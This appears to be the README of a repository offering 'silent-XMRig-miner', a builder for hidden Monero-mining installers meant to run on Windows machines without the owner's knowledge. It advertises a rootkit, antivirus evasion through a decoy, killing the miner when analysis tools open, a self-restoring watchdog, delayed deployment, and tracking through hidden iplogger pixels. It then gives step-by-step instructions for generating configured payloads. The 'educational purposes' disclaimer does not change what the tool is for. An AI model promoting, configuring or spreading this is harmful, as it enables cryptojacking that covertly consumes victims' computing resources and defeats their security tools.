# silent-XMRig-miner

A free silent (hidden) XMRig installer, capable of installing XMRig miner for silent mining operation.

This miner can do any CPU alghorithm that XMRig v6.19.1 can, as essentially it is a wrapping of it with additional features.

# The silent-XMRig-miner feutures are:
- Native C/C++ - Miner installer and watchdog coded fully in C++ with no run requirements except a 64-bit Windows OS
- Restricted Mining - Can be configured to mine at different CPU usages to do not bother PC user
- Gentle RAM mode - uses "light" mode if system has low ram
- Multiple pools - can be configured to use specified multiple pools according to time zones to get lower latency
- Multiple addresses - allows to set multiple addresses in case one is banned
- Stealth - Kills the miner process and clears the RAM while any processes analysis tools are open
- Watchdog - Monitors the miner file, miner process and startup entry and restores the miner if anything is removed or killed
- Delayed install - Watchdog installs miner only after specified wait time
- Windows Defender Exclusions - Does not need to be added to exclusions as it is  silent for AVs by using a decoy
- Rootkit - Has a built-in rootkit that fully hides the miner and watchdog
- Maximum performance - Drops WinRing0x64.sys driver if absent and uses huge pages

# How to start
- You can download binaries from [releases](https://github.com/operationalguy/silent-XMRig-miner/releases) page
- You can download the repository and use already built binaries
- You can build SilentMinerConfigurator from sources using Visual Studio
- Follow instructions below, they contain all information needed

# SilentMinerConfigurator instructions
##### Monero mining:
SilentMinerConfigurator already comes with example configuration for Monero mining, you just need to put your addresses
1. Paste your XMR addresses in "Wallets addresses" section. You can specify only one address, but you will need to place it in every 5 boxes
2. Specify pools in "Time Zone n pools". We recommend specifying more than 1 pool for each time zone. N Time zones are:
    1. Zone 1 - from "UTC -11" to "UTC -7" (America west pools)
    2. Zone 2 - from "UTC -6" to "UTC -3" (America east pools)
    3. Zone 3 - from "UTC -2" to "UTC +4" (Europe pools)
    4. Zone 4 - from "UTC +5" to "UTC +12" (Asia pools)
3.  Change "Installer delay" if needed. Lower time - more prone to AVs suspicion. Bigger time - PC can be turned off before anything is installed
4. Change "Delay before deploy miner" if needed. It is time(days) watchdog will wait before deploying silent-XMRig-miner and starting mining operation
5. Change "Minimum RAM for light mode" if needed, it is minimum RAM before applying "light" mode
6. Change "CPU (%)" it is the CPU usage for mining in threads, L3 cache is also taken in consideration
7. Change "Additional XMRig arguments" if needed, you can add arguments o remove.
8. Skip "L3 cache/thread" as Randomx uses 2048 KB
9. (Optional) add URL to 'Miner install finished 'Ping' URL', to which HTTP/HTTPS 'GET' request will be sent when installed (I like to use iplogger.org hidden pixel).
10. (Optional) add URL to 'Miner starts mining 'Ping' URL' to which HTTP/HTTPS 'GET' request will be sent every time miner is started (I like to use iplogger.org hidden pixel).
11. Skip "Custom arguments" this section is intended for configurations that can not be acomplished by fields above
12. Test arguments. Press "Test" button, and in "Arguments test" you will see arguments that will be passed to XMRig at start. Copy and test every arguments with official XMRig miner before clicking "Generate"
13. Click "Generate", and "configguredInstallerEXE.exe" binary will appear in "Binaries" directory, same for dll.

##### Non Monero mining:

1. Same as above except you will need to change "Additional XMRig arguments" to change coin and change "L3 cache/thread" if it is different and light mode is supported
2. You can use "Custom arguments config" so everything else will be ignored, even time zone pools
3. Be careful here, always test arguments.

# SilentMinerConfigurator description

- Wallets addresses - 5 addresses from which two randomly will be selected, one as primary and second as secondary for secondary pool.
- Time Zone n pools - 4 pools for each supported time zone. Not all 4 pools needs to be populated. At least one pool needs to be present. Primary and secondary pools are selected randomly according to time zone, if the program can't get time zone, pools are selected randomly from all pools. Time zones are:
    1. Zone 1 - from "UTC -11" to "UTC -7" (America west pools)
    2. Zone 2 - from "UTC -6" to "UTC -3" (America east pools)
    3. Zone 3 - from "UTC -2" to "UTC +4" (Europe pools)
    4. Zone 4 - from "UTC +5" to "UTC +12" (Asia pools)
- Installer delay - delay in milliseconds before installing silent-XMRig-miner. Time is selected randomly between Min. and Max. values during install process.
- Delay before deploy miner - Delay in days which silent-XMRig-miner watchdog waits before deploying miner and starting mining operation on the system. Time in days is selected randomly between Min. and Max. values
- Additional XMRig arguments - entire arguments string from this field is appended at the end of arguments for primary and secondary pools. Here you configure the coin that is mined and other XMRig stuff.
- Minimum RAM for light mode - If system has less than specified value '--randomx-mode light' to XMRig arguments.(System always has less memory than installed as there are always some "Hardware reserved")
- CPU(%) - Maximum % of threads to be used for mining, L3 cache is taken into account too. But at least 1 thread will be mining even at 0%.
- L3 cache/thread - Amount of L3 cache in KB needed for 1 thread for mining, for Monero(Randomx) it is 2048. This value affects CPU(%) calculated number of threads value.
-Miner install finished 'Ping' URL - URL to which HTTP/HTTPS 'GET' request will be sent when installed.
-Miner starts mining 'Ping' URL - URL to which HTTP/HTTPS 'GET' request will be sent every time miner is started.
- Custom arguments - If anything is present in this fields, one of 3 filed(selected randomly) will be used as arguments for XMRig and everything above will be ignored
- Test button - Populates 'Arguments test' field with composed arguments the same way as silent-XMRig-miner does. This way you can test before configuring. It will take in account your current time zone and CPU information.
- Generate button - Writes configuration in to silent-XMRig-miner installer.

# silent-XMRig-miner dll

configuredinstallerDLL.dll(output of configuration process) is the same as configuredInstallerEXE.exe except for the way to run it.

configuredinstallerDLL.dll exports `mainToRun()` function that is needed to be called.
Export is done in this way:
```
extern "C" {
    __declspec(dllexport)int mainToRun()
    {
        return mainProc();
    }
}
```
configuredInstallerEXE.exe also calls `mainProc()` function, so almost no difference between binaries.

# Repository contents

- ./SilentMinerConfigurator - GUI application in C++ which is used to configure silent-XMRig-miner installers executable and dll
- ./Binaries - Directory contains unconfigured silent-XMRig-miner installer as executable and dll and also SilentMinerConfigurator binary
- ./libs - C++ code that is shared with XMRig wrapper and SilenMinerConfigurator

# Fees

The miner is configured in a way that every time silent-XMRig-miner starts it randoms a number between 0 and 9, and if the result is 0, it mines for developers until restarted. So the fee is 10%. 

# Disclaimer

We, the creators, are not responsible for any actions, and or damages, caused by this software.

You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.

This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.

By using this software, you automatically agree to the above

# License

This project is licensed under the MIT License

# Support

- Best support is to report any bugs you have found, so we can fix them
- Another way is to spread word about us
- If you would like to donate, we accept only Monero, the address is below:

XMR:
45FwrJ3gK8CYgkzBAn5Pga1huGKEuBhySWbZ9TXTZwjkfmjjp95aivrW9MdjaV9n1cSdU2KDcY7gq43uvobHvGLARkQfedy
